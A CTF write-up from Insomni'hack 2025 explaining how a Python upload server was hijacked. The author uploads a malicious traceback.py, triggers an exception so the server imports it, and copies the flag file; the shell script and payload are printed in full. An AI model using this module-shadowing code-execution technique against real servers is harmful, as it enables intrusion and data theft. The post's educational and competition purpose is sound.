---
layout:     post
title:      "Hijacking a Python upload server: writeup from Insomni'hack CTF 2025"
date:       2025-03-16 13:00:00
tags:       linux, security, programming, python
---

This blog post is a write up of an "Upload Server" challenge where we had to hack a simple server written in Python and steal a secret file (flag) from it. The task comes from the Insomni'hack CTF 2025 competition that I played with my team, justCatTheFish in Lausanne, Switzerland. Overall, we scored 4th place (or 5th overall, though academic teams had separate ranking). Below you can see how it looked like :).

Venue:
![Venue photo]({{ site.url }}assets/posts/inso2025/inso2025-venue1.jpeg)

Final CTF competition scoreboard:
![Final scoreboard]({{ site.url }}assets/posts/inso2025/inso2025-scoreboard.png)

## The "Upload Server" challenge

The organizers provided us the sources: a Dockerfile and a server.py file, so we could run and hack on the task locally . In addition to that each team could spawn their own instance of the task in order to steal the actual secret flag to obtain points in the competition.

If you want to replay the challenge, you can download its files [here]({{ site.url }}assets/posts/inso2025/uploadserver-7e420c6d42203d316643ea7284312e077a159e5a74124f38a37c8c10002d599b.zip) and you can build and run it locally with the following commands:

```sh
docker build -t serv .
docker run --rm -it -p 9000:9000 serv
```

The Dockerfile of the challenge was fairly trivial:

```dockerfile
FROM python:3.10

RUN echo "INS{FAKE_FLAG!}" > /flag.txt

WORKDIR /app

COPY server.py /app/server.py

EXPOSE 9000

ENTRYPOINT ["python3", "/app/server.py"]
```

And the server.py was a bit longer, but still, only 90 lines of code:

```python
import http.server
import socketserver
import os
import base64
import cgi
from pathlib import Path

USERNAME = os.getenv("USERNAME", "admin")
PASSWORD = os.getenv("PASSWORD", "password")

PORT = 9000
UPLOAD_DIR = "."

os.makedirs(UPLOAD_DIR, exist_ok=True)

class SecureHandler(http.server.SimpleHTTPRequestHandler):
    def authenticate(self):
        auth_header = self.headers.get("Authorization")
        if not auth_header or not auth_header.startswith("Basic "):
            return False

        encoded_credentials = auth_header.split(" ")[1]
        decoded_credentials = base64.b64decode(encoded_credentials).decode("utf-8")
        input_username, input_password = decoded_credentials.split(":", 1)

        return input_username == USERNAME and input_password == PASSWORD

    def do_AUTHHEAD(self):
        self.send_response(401)
        self.send_header("WWW-Authenticate", 'Basic realm="Secure Upload Server"')
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(b"Unauthorized Access\n")

    def do_GET(self):
        if not self.authenticate():
            self.do_AUTHHEAD()
            return

        requested_path = self.translate_path(self.path)
        if os.path.isfile(requested_path):
            return http.server.SimpleHTTPRequestHandler.do_GET(self)

        return self.list_directory(requested_path)

    def list_directory(self, path):
        self.send_response(403)
        self.end_headers()
        self.wfile.write(b"Directory listing is disabled.")
        return None

    def do_POST(self):
        if not self.authenticate():
            self.do_AUTHHEAD()
            return

        content_type, pdict = cgi.parse_header(self.headers.get('Content-Type'))
        if content_type == 'multipart/form-data':
            pdict['boundary'] = bytes(pdict['boundary'], "utf-8")
            fields = cgi.parse_multipart(self.rfile, pdict)

            for field in fields:
                filename = os.path.basename(field)
                safe_path = Path(UPLOAD_DIR) / filename
                safe_path = safe_path.resolve()

                if not str(safe_path).startswith(str(Path(UPLOAD_DIR).resolve())):
                    self.send_response(400)
                    self.end_headers()
                    self.wfile.write(b"Invalid file path")
                    return

                with open(safe_path, "wb") as f:
                    f.write(fields[field][0])

            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"File uploaded successfully\n")
        else:
            self.send_response(400)
            self.end_headers()
            self.wfile.write(b"Invalid upload request\n")

class ThreadingTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    daemon_threads = True
    allow_reuse_address = True

with ThreadingTCPServer(("", PORT), SecureHandler) as httpd:
    print(f"Server running on port {PORT} with Basic Auth ({USERNAME}/{PASSWORD})")
    httpd.serve_forever()
```

## Analysing the code

The code creates a threading TCP server on port 9000 which implements a `do_GET` and `do_POST` handlers for the respective HTTP request methods. Those functions allow us to get and create files if we authenticated properly whereas the authentication is just a (not so great) Basic HTTP authentication, where you encode username and password delimited by the ":" character and encode it with the base64 encoding.

```python
USERNAME = os.getenv("USERNAME", "admin")
PASSWORD = os.getenv("PASSWORD", "password")

class SecureHandler(http.server.SimpleHTTPRequestHandler):
    def authenticate(self):
        auth_header = self.headers.get("Authorization")
        if not auth_header or not auth_header.startswith("Basic "):
            return False
    
        encoded_credentials = auth_header.split(" ")[1]
        decoded_credentials = base64.b64decode(encoded_credentials).decode("utf-8")
        input_username, input_password = decoded_credentials.split(":", 1)

        return input_username == USERNAME and input_password == PASSWORD
```

Actually, the server compares the decoded username and password insecurely, using a non-constant time comparison, which may allow us to leak the expected username and password (if they were changed through environment variables) using a "timing attack" technique where we would compare the difference in time it takes to compare different usernames and passwords (`"aa"=="ab"` takes longer than `"bb"=="ab"`). In practice, such an attack would likely be infeasible as the comparison timing differences are too small to measure over the network.

To add to that, the organizers actually gave us the username and password values for the instance that we spawned. So in the end, we did not have to break the authentication at all.

Then, in the `do_GET` handler, the server translates the provided path and if it is a file, it returns a `http.server.SimpleHTTPRequestHandler.do_GET(self)`. This base class method eventually returns the requested file after translating its path (for the second time!) which we can see below. If the path is not a file, a `list_directory` is called, which really just returns a HTTP response with a 403 status code that "Directory listing is not enabled".

```python
class SecureHandler(http.server.SimpleHTTPRequestHandler):
    # ...
    def do_GET(self):
        # ...
        requested_path = self.translate_path(self.path)
        if os.path.isfile(requested_path):
            return http.server.SimpleHTTPRequestHandler.do_GET(self)

        return self.list_directory(requested_path)

    def list_directory(self, path):
        self.send_response(403)
        self.end_headers()
        self.wfile.write(b"Directory listing is disabled.")
        return None


class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    # ...
    def do_GET(self):
        """Serve a GET request."""
        f = self.send_head()
        if f:
            try:
                self.copyfile(f, self.wfile)  # wfile is the socket
            finally:
                f.close()

    def send_head(self):
        path = self.translate_path(self.path)
        # ...
        if os.path.isdir(path):
            parts = urllib.parse.urlsplit(self.path)
            # ...
        f = open(path, 'rb')
        # ...
        return f
```

In the `do_POST`, the server processes the uploaded file path and content through a multipart form data and eventually saves it to a safe path:

```python
class SecureHandler(http.server.SimpleHTTPRequestHandler):
    # ...
    def do_POST(self):
        # ...
        content_type, pdict = cgi.parse_header(self.headers.get('Content-Type'))
        if content_type == 'multipart/form-data':
            pdict['boundary'] = bytes(pdict['boundary'], "utf-8")

            fields = cgi.parse_multipart(self.rfile, pdict)

            for field in fields:
                filename = os.path.basename(field)
                safe_path = Path(UPLOAD_DIR) / filename
                safe_path = safe_path.resolve()

                if not str(safe_path).startswith(str(Path(UPLOAD_DIR).resolve())):
                    # ... - return 400: Invalid file path
                    return

                with open(safe_path, "wb") as f:
                    f.write(fields[field][0])
```

### Interacting with the server

Just for completeness, we can interact with the server in the following three ways:

1. We can download files via: `curl -u 'admin:password' --path-as-is -v http://localhost:9000/path-here`. Note that we pass the `--path-as-is` so that the `curl` tool do not normal paths like `../../flag.txt` into `/flag.txt`.
2. We can send files via: `curl -v -F "filename=@file" -X POST -u admin:password http://localhost:9000/` where this will sent the content from the `file` file from current directory.
3. We can actually crash the server via: `curl -v -F "lol=plik" -X POST -u admin:password http://localhost:9000/`.

With the last one, the server crashes in some of its processing and reports the following traceback:

```
Exception occurred during processing of request from ('172.17.0.1', 47464)
Traceback (most recent call last):
  File "/usr/local/lib/python3.10/socketserver.py", line 683, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/local/lib/python3.10/socketserver.py", line 360, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/local/lib/python3.10/http/server.py", line 668, in __init__
    super().__init__(*args, **kwargs)
  File "/usr/local/lib/python3.10/socketserver.py", line 747, in __init__
    self.handle()
  File "/usr/local/lib/python3.10/http/server.py", line 433, in handle
    self.handle_one_request()
  File "/usr/local/lib/python3.10/http/server.py", line 421, in handle_one_request
    method()
  File "/app/server.py", line 74, in do_POST
    f.write(fields[field][0])
TypeError: a bytes-like object is required, not 'str'
```

This happens because there is a small difference between sending a file in a form in curl with the `-F "filename=content"` flag vs `-F "filename=@file"`. The former will send it as:

```
Content-Type: multipart/form-data; boundary=------------------------zwbJi1vcxCL0w1ITX7Pv4W

--------------------------zwbJi1vcxCL0w1ITX7Pv4W
Content-Disposition: form-data; name="filename"

content
--------------------------zwbJi1vcxCL0w1ITX7Pv4W--
```

While the latter will send:

```
Content-Type: multipart/form-data; boundary=------------------------SqWUMBvrFIVx6KRl7yb1o1

--------------------------SqWUMBvrFIVx6KRl7yb1o1
Content-Disposition: form-data; name="filename"; filename="p"
Content-Type: application/octet-stream

a

--------------------------SqWUMBvrFIVx6KRl7yb1o1--
```

The latter sets the `Content-Type: application/octet-stream` which makes the upload server code see a bytestring (`bytes` type) instead of a string (`str`) type. Without the content type, the server crashes.


### Solution ideas

When trying to solve this, we came up with a couple of ideas:

1. Path traversal. Our obvious first idea was that maybe there is a path we can provide to the `do_GET` functionality to obtain the `/flag.txt` file? Maybe something like `../../../../flag.txt` (or urlencoded: `%2e%2e%2f%2e%2e%2fflag.txt`)? Not really. This did not work here.
2. Race condition. This was a threading server and the `SecureHandler.do_GET` reads the `self.path` multiple times. I thought that maybe the `SecureHandler` object is shared between two threads that process two consecutively sent requests, but in practice its not. The `socketserver.ThreadingMixIn` correctly creates a separate instances of `SecureHandler` for each consecutive request. We actually tested this by modifying the app and printing out the ID of the `SecureHandler` object when the `do_GET` was executed (`print(id(self))`).
3. We can create arbitrary files. Is there a file we can write that would eventually be executed by the server?

### Are there any files that are executed by the server?

It turns out that we can even overwrite the `server.py` file. However, this gives us nothing, because the script is never reloaded/read again by the upload server (neither by its threads etc).

So are there any other ways? Well, since it is a Python code, for it to execute some code, it would have to for example invoke an `import` statement for a module that hasn't been loaded yet.

And... it turns out that there is such a case. We actually discovered it by reading the code and finding the import statement, but this can also be found with `strace`, the system call trace tool to see which files are attempted to be opened by the server when it runs.

This can be seen below, where we show the output of strace on the server when we execute different actions. We run the strace as: `sudo strace -f -e openat -p $(pgrep -f 'python3 /app/server.py')`.

Strace outputs:

1. When we get a file that exists (`curl -vvv -u admin:password localhost:9000/server.py`):
```
strace: Process 165954 attached
[pid 165954] openat(AT_FDCWD, "/etc/mime.types", O_RDONLY|O_CLOEXEC) = 5
[pid 165954] openat(AT_FDCWD, "/app/server.py", O_RDONLY|O_CLOEXEC) = 5
[pid 165954] +++ exited with 0 +++
```
2. When we send a valid file (`curl -v -F "a=@plik" -X POST -u admin:password localhost:9000/server.py`):
```
strace: Process 165990 attached
[pid 165990] openat(AT_FDCWD, "/tmp/f08q3cme", O_RDWR|O_CREAT|O_EXCL|O_NOFOLLOW|O_CLOEXEC, 0600) = 5
[pid 165990] openat(AT_FDCWD, "/tmp", O_RDWR|O_EXCL|O_NOFOLLOW|O_CLOEXEC|O_TMPFILE, 0600) = -1 EOPNOTSUPP (Operation not supported)
[pid 165990] openat(AT_FDCWD, "/tmp/tmpjl1qriex", O_RDWR|O_CREAT|O_EXCL|O_NOFOLLOW|O_CLOEXEC, 0600) = 5
[pid 165990] openat(AT_FDCWD, "/app/a", O_WRONLY|O_CREAT|O_TRUNC|O_CLOEXEC, 0666) = 5
[pid 165990] +++ exited with 0 +++
```
3. And when we send a file that causes the server to raise an exception (`curl -v -F "a=content" -X POST -u admin:password localhost:9000/server.py`):
```
[pid 165990] +++ exited with 0 +++
strace: Process 166018 attached
[pid 166018] openat(AT_FDCWD, "/app/a", O_WRONLY|O_CREAT|O_TRUNC|O_CLOEXEC, 0666) = 5
[pid 166018] openat(AT_FDCWD, "/app", O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_DIRECTORY) = 5
[pid 166018] openat(AT_FDCWD, "/usr/local/lib/python3.10/__pycache__/traceback.cpython-310.pyc", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
[pid 166018] openat(AT_FDCWD, "/usr/local/lib/python3.10/traceback.py", O_RDONLY|O_CLOEXEC) = 5
[pid 166018] openat(AT_FDCWD, "/usr/local/lib/python3.10/__pycache__/traceback.cpython-310.pyc.127715404047712", O_WRONLY|O_CREAT|O_EXCL|O_CLOEXEC, 0644) = 5
[pid 166018] openat(AT_FDCWD, "/usr/local/lib/python3.10/__pycache__/linecache.cpython-310.pyc", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
[pid 166018] openat(AT_FDCWD, "/usr/local/lib/python3.10/linecache.py", O_RDONLY|O_CLOEXEC) = 5
[pid 166018] openat(AT_FDCWD, "/usr/local/lib/python3.10/__pycache__/linecache.cpython-310.pyc.127715404047488", O_WRONLY|O_CREAT|O_EXCL|O_CLOEXEC, 0644) = 5
[pid 166018] openat(AT_FDCWD, "/usr/local/lib/python3.10/__pycache__/tokenize.cpython-310.pyc", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
[pid 166018] openat(AT_FDCWD, "/usr/local/lib/python3.10/tokenize.py", O_RDONLY|O_CLOEXEC) = 5
[pid 166018] openat(AT_FDCWD, "/usr/local/lib/python3.10/__pycache__/tokenize.cpython-310.pyc.127715404047936", O_WRONLY|O_CREAT|O_EXCL|O_CLOEXEC, 0644) = 5
[pid 166018] openat(AT_FDCWD, "/usr/local/lib/python3.10/__pycache__/token.cpython-310.pyc", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
[pid 166018] openat(AT_FDCWD, "/usr/local/lib/python3.10/token.py", O_RDONLY|O_CLOEXEC) = 5
[pid 166018] openat(AT_FDCWD, "/usr/local/lib/python3.10/__pycache__/token.cpython-310.pyc.127715404050848", O_WRONLY|O_CREAT|O_EXCL|O_CLOEXEC, 0644) = 5
[pid 166018] openat(AT_FDCWD, "/usr/local/lib/python3.10/socketserver.py", O_RDONLY|O_CLOEXEC) = 5
[pid 166018] openat(AT_FDCWD, "/usr/local/lib/python3.10/http/server.py", O_RDONLY|O_CLOEXEC) = 5
[pid 166018] openat(AT_FDCWD, "/app/server.py", O_RDONLY|O_CLOEXEC) = 5
[pid 166018] +++ exited with 0 +++
```

What we can see here is that the server loads a `traceback.py` module and first checks for it python compiled file (.pyc).

Now... what would happen if `traceback.py` existed in `/app/`?

### The solution

It turns out that by uploading in the `traceback.py` file and triggering the exception for the first time, the server imports the `traceback` module from the `/app/` directory and trigger our code!

*Note: Of course if the exception would be triggered before that, the module would already be loaded and its `import` would not reload it. But we can create our own instance of the challenge and thus exploit this fact.*

So to solve the challenge, we can use the following script:

```sh
#!/bin/sh

# Server setup
ADM=admin
PASS=password
URL="127.0.0.1:9000/"

curl -v -F "traceback.py=@traceback.py" -X POST -u $ADM:$PASS http://$URL
curl -v -F "lol=plik" -X POST -u $ADM:$PASS http://$URL
curl -v -u $ADM:$PASS http://$URL/myflag
```

With a `traceback.py` file with our payload. In my case it was the original traceback.py copied out from the container (with the `docker cp ...` command) plus the following:

```py
import os
os.system("cp /flag.txt /app/myflag")
```

As a result, executing the shell script from above we uploaded traceback.py, got it executed, which copied the flag to `/app/myflag` and then we just read it with the `do_GET` method since it read files from  `/app`.

Below you can see a screenshot from my terminals when I solved the challenge :).

![Solve photo]({{ site.url }}assets/posts/inso2025/inso2025-uploadserver-solv.webp)
